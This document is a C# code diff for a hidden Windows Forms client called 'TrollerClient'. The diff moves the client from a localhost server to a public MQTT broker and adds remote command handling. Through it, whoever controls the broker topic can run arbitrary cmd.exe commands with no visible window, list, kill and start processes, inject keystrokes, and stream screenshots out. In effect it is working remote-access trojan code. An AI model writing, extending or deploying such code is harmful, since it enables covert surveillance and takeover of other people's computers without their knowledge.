@@ -1,13 +1,20 @@
-using Microsoft.AspNetCore.SignalR.Client;
+using MQTTnet;
+using MQTTnet.Client;
+using Newtonsoft.Json;
+using System.Diagnostics;
 using System.Drawing.Imaging;
 
 namespace TrollerClient;
 
 public partial class Form1 : Form
 {
-    private HubConnection? _connection;
+    private IMqttClient _mqttClient;
     private System.Windows.Forms.Timer _captureTimer;
     private bool _isStreaming = false;
+
+    private const string B_TOPIC = "velocityzdx_trollerlink_74f9d2x1";
+    private const string CMD_TOPIC = B_TOPIC + "/cmd";
+    private const string RAW_TOPIC = B_TOPIC + "/raw";
 
     public Form1()
     {
@@ -18,47 +25,133 @@ public partial class Form1 : Form
         this.Hide();
 
         _captureTimer = new System.Windows.Forms.Timer();
-        _captureTimer.Interval = 100; // ~10 fps
+        _captureTimer.Interval = 200; // ~5 fps
         _captureTimer.Tick += CaptureTimer_Tick;
 
-        ConnectToServerAsync();
+        ConnectMqttAsync();
     }
 
-    private async void ConnectToServerAsync()
+    private async void ConnectMqttAsync()
     {
-        // Replace with actual domain when deployed, e.g. "https://monitor.yourdomain.com/screenHub"
-        _connection = new HubConnectionBuilder()
-            .WithUrl("http://localhost:5000/screenHub")
-            .WithAutomaticReconnect()
+        var factory = new MqttFactory();
+        _mqttClient = factory.CreateMqttClient();
+
+        var options = new MqttClientOptionsBuilder()
+            .WithClientId(Guid.NewGuid().ToString())
+            .WithTcpServer("broker.hivemq.com", 1883)
+            .WithCleanSession()
             .Build();
 
-        _connection.On<string>("CommandStartStream", (targetId) =>
+        _mqttClient.ApplicationMessageReceivedAsync += async e =>
         {
-            // In a real app, you'd check if targetId matches this client's unique ID
-            _isStreaming = true;
-            _captureTimer.Start();
-        });
+            var msg = System.Text.Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment);
+            if (e.ApplicationMessage.Topic == CMD_TOPIC)
+            {
+                try {
+                    await HandleCommand(JsonConvert.DeserializeObject<dynamic>(msg)!);
+                } catch { }
+            }
+        };
 
-        _connection.On<string>("CommandStopStream", (targetId) =>
+        _mqttClient.ConnectedAsync += async e =>
+        {
+            await _mqttClient.SubscribeAsync(CMD_TOPIC);
+            await PublishAsync("terminal", "PC Client connected securely.");
+        };
+
+        _mqttClient.DisconnectedAsync += async e =>
+        {
+            await Task.Delay(TimeSpan.FromSeconds(5));
+            try { await _mqttClient.ConnectAsync(options); } catch { }
+        };
+
+        try { await _mqttClient.ConnectAsync(options); } catch { }
+    }
+
+    private async Task HandleCommand(dynamic data)
+    {
+        string action = data.action;
+        string payload = data.payload ?? "";
+
+        if (action == "stream_start")
+        {
+            _isStreaming = true;
+            this.Invoke(() => _captureTimer.Start());
+        }
+        else if (action == "stream_stop")
         {
             _isStreaming = false;
-            _captureTimer.Stop();
-        });
-
-        try
-        {
-            await _connection.StartAsync();
-            // Start streaming immediately for testing, usually wait for command
-            _isStreaming = true;
-            _captureTimer.Start();
+            this.Invoke(() => _captureTimer.Stop());
         }
-        catch { }
+        else if (action == "run_cmd")
+        {
+            var startInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = $"/c {payload}",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+            try {
+                using var p = Process.Start(startInfo);
+                string output = p!.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+                await PublishAsync("terminal", string.IsNullOrWhiteSpace(output) ? "Done." : output);
+            } catch (Exception ex) {
+                await PublishAsync("terminal", "Error: " + ex.Message);
+            }
+        }
+        else if (action == "get_tasks")
+        {
+            var procs = Process.GetProcesses()
+                .Select(p => new { Id = p.Id, Name = p.ProcessName, Mem = (p.WorkingSet64 / 1024 / 1024) })
+                .OrderByDescending(p => p.Mem).Take(50).ToArray();
+            await PublishAsync("tasks", JsonConvert.SerializeObject(procs));
+        }
+        else if (action == "kill_task")
+        {
+            try {
+                Process.GetProcessById(int.Parse(payload)).Kill();
+                await PublishAsync("terminal", $"Killed task {payload}");
+            } catch (Exception ex) {
+                await PublishAsync("terminal", "Failed to kill: " + ex.Message);
+            }
+        }
+        else if (action == "start_task")
+        {
+            try {
+                Process.Start(payload);
+                await PublishAsync("terminal", $"Started task {payload}");
+            } catch (Exception ex) {
+                await PublishAsync("terminal", "Failed to start: " + ex.Message);
+            }
+        }
+        else if (action == "keystroke" || action == "text")
+        {
+            this.Invoke(() => {
+                try { SendKeys.SendWait(payload); } catch { }
+            });
+            await PublishAsync("terminal", $"Sent keys: {payload}");
+        }
+    }
+
+    private async Task PublishAsync(string type, string data)
+    {
+        if (_mqttClient == null || !_mqttClient.IsConnected) return;
+
+        var msg = JsonConvert.SerializeObject(new { type, data });
+        var appMsg = new MqttApplicationMessageBuilder()
+            .WithTopic(RAW_TOPIC)
+            .WithPayload(System.Text.Encoding.UTF8.GetBytes(msg))
+            .Build();
+            
+        await _mqttClient.PublishAsync(appMsg);
     }
 
     private async void CaptureTimer_Tick(object? sender, EventArgs e)
     {
-        if (!_isStreaming || _connection?.State != HubConnectionState.Connected)
-            return;
+        if (!_isStreaming || _mqttClient == null || !_mqttClient.IsConnected) return;
 
         try
         {
@@ -69,18 +162,20 @@ public partial class Form1 : Form
                 g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
             }
 
-            // Scale down to reduce bandwidth (e.g. 1/2 size)
-            var scaledWidth = bounds.Width / 2;
-            var scaledHeight = bounds.Height / 2;
-            using var scaledBitmap = new Bitmap(bitmap, new Size(scaledWidth, scaledHeight));
+            // Scale to 720p roughly
+            int targetWidth = 1280;
+            int targetHeight = (int)(bounds.Height * (1280.0 / bounds.Width));
+            using var scaledBitmap = new Bitmap(bitmap, new Size(targetWidth, targetHeight));
 
             using var ms = new MemoryStream();
-            scaledBitmap.Save(ms, ImageFormat.Jpeg);
+            var encoder = ImageCodecInfo.GetImageDecoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
+            var encoderParams = new EncoderParameters(1);
+            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L); // 50% Quality
+
+            scaledBitmap.Save(ms, encoder, encoderParams);
             
             var base64 = Convert.ToBase64String(ms.ToArray());
-            
-            // Send to Relay
-            await _connection.InvokeAsync("SendFrame", Environment.MachineName, base64);
+            await PublishAsync("frame", base64);
         }
         catch { }
     }
